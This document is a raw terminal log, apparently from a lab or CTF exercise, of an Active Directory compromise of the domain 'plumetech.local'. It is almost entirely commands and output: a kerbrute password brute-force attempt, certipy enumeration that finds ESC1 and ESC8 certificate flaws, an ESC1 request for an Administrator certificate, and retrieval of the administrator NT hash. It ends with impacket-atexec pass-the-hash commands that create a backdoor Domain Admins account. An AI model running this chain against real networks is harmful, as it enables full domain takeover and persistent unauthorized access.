└─$ kerbrute bruteuser --dc 10.0.7.11 -d plumetech.local --delay 13000 2023-200_most_used_passwords.txt bethany

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 03/28/25 - Ronnie Flathers @ropnop

2025/03/28 15:53:44 >  Using KDC(s):
2025/03/28 15:53:44 >   10.0.7.11:88

2025/03/28 15:53:44 >  Delay set. Using single thread and delaying 13000ms between attempts

^C

┌──(kali㉿kali)-[~]
└─$ certipy-ad find -vulnerable -u evan@plumetech.local -p 'Abcd@123' -stdout
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[!] Failed to resolve: PLUMETECH.LOCAL
[!] Failed to resolve: PLUMETECH.LOCAL
[-] Got error: invalid server address
[-] Use -debug to print a stacktrace

┌──(kali㉿kali)-[~]
└─$ sudo nano /etc/hosts

┌──(kali㉿kali)-[~]
└─$ certipy-ad find -vulnerable -u evan@plumetech.local -p 'Abcd@123' -stdout
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'PLUMETECH-DC1-CA' via CSRA
[!] Got error while trying to get CA configuration for 'PLUMETECH-DC1-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'PLUMETECH-DC1-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'PLUMETECH-DC1-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : PLUMETECH-DC1-CA
    DNS Name                            : DC1.PLUMETECH.LOCAL
    Certificate Subject                 : CN=PLUMETECH-DC1-CA, DC=PLUMETECH, DC=LOCAL
    Certificate Serial Number           : 116CE7383FB081B7498EE8F3439CBE84
    Certificate Validity Start          : 2025-03-27 01:26:17+00:00
    Certificate Validity End            : 2030-03-27 01:36:16+00:00
    Web Enrollment                      : Enabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : PLUMETECH.LOCAL\Administrators
      Access Rights
        ManageCertificates              : PLUMETECH.LOCAL\Administrators
                                          PLUMETECH.LOCAL\Domain Admins
                                          PLUMETECH.LOCAL\Enterprise Admins
        ManageCa                        : PLUMETECH.LOCAL\Administrators
                                          PLUMETECH.LOCAL\Domain Admins
                                          PLUMETECH.LOCAL\Enterprise Admins
        Enroll                          : PLUMETECH.LOCAL\Authenticated Users
    [!] Vulnerabilities
      ESC8                              : Web Enrollment is enabled and Request Disposition is set to Issue
Certificate Templates
  0
    Template Name                       : Smartcard
    Display Name                        : Smartcard
    Certificate Authorities             : PLUMETECH-DC1-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : None
    Private Key Flag                    : 16842752
    Extended Key Usage                  : Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : PLUMETECH.LOCAL\Domain Users
      Object Control Permissions
        Owner                           : PLUMETECH.LOCAL\Enterprise Admins
        Full Control Principals         : PLUMETECH.LOCAL\Domain Admins
                                          PLUMETECH.LOCAL\Local System
                                          PLUMETECH.LOCAL\Enterprise Admins
        Write Owner Principals          : PLUMETECH.LOCAL\Domain Admins
                                          PLUMETECH.LOCAL\Local System
                                          PLUMETECH.LOCAL\Enterprise Admins
        Write Dacl Principals           : PLUMETECH.LOCAL\Domain Admins
                                          PLUMETECH.LOCAL\Local System
                                          PLUMETECH.LOCAL\Enterprise Admins
        Write Property Principals       : PLUMETECH.LOCAL\Domain Admins
                                          PLUMETECH.LOCAL\Local System
                                          PLUMETECH.LOCAL\Enterprise Admins
    [!] Vulnerabilities
      ESC1                              : 'PLUMETECH.LOCAL\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication

┌──(kali㉿kali)-[~]
└─$ enum4linux -u '' -p '' 10.0.7.11
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Mar 28 16:10:18 2025

 =========================================( Target Information )=========================================

Target ........... 10.0.7.11
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 =============================( Enumerating Workgroup/Domain on 10.0.7.11 )=============================


[E] Can't find workgroup/domain



 =====================================( Session Check on 10.0.7.11 )=====================================


[+] Server 10.0.7.11 allows sessions using username '', password ''


 ==================================( Getting domain SID for 10.0.7.11 )==================================

Domain Name: PLUMETECH
Domain Sid: S-1-5-21-1132163210-3804680402-240431838

[+] Host is part of a domain (not a workgroup)

enum4linux complete on Fri Mar 28 16:10:32 2025


┌──(kali㉿kali)-[~]
└─$ certipy-ad req -username evan@plumetech.local -password 'Abcd@123' -ca PLUMETECH-DC1-CA -target 10.0.7.11 -template Smartcard -upn Administrator@plumetech.local -sid 'S-1-5-21-1132163210-3804680402-240431838-500'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 3
[*] Got certificate with UPN 'Administrator@plumetech.local'
[*] Certificate object SID is 'S-1-5-21-1132163210-3804680402-240431838-500'
[*] Saved certificate and private key to 'administrator.pfx'

┌──(kali㉿kali)-[~]
└─$ certipy-ad auth -pfx administrator.pfx -dc-ip 10.0.7.11
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@plumetech.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@plumetech.local': aad3b435b51404eeaad3b435b51404ee:1fd1d635bb86dedf13da89a01ab020b4

┌──(kali㉿kali)-[~]
└─$ impacket-atexec -hashes aad3b435b51404eeaad3b435b51404ee:1fd1d635bb86dedf13da89a01ab020b4 plumetech.local/administrator@10.0.7.11 'net user plumber TestGeslo123! /add /y'
impacket-atexec -hashes aad3b435b51404eeaad3b435b51404ee:1fd1d635bb86dedf13da89a01ab020b4 plumetech.local/administrator@10.0.7.11 'net group "Domain Admins" plumber /add /y'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[!] This will work ONLY on Windows >= Vista
[*] Creating task \shzrxmnr
[*] Running task \shzrxmnr
[*] Deleting task \shzrxmnr
[*] Attempting to read ADMIN$\Temp\shzrxmnr.tmp
[*] Attempting to read ADMIN$\Temp\shzrxmnr.tmp
The command completed successfully.


Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[!] This will work ONLY on Windows >= Vista
[*] Creating task \zCtczZbB
[*] Running task \zCtczZbB
[*] Deleting task \zCtczZbB
[*] Attempting to read ADMIN$\Temp\zCtczZbB.tmp
[*] Attempting to read ADMIN$\Temp\zCtczZbB.tmp
The command completed successfully.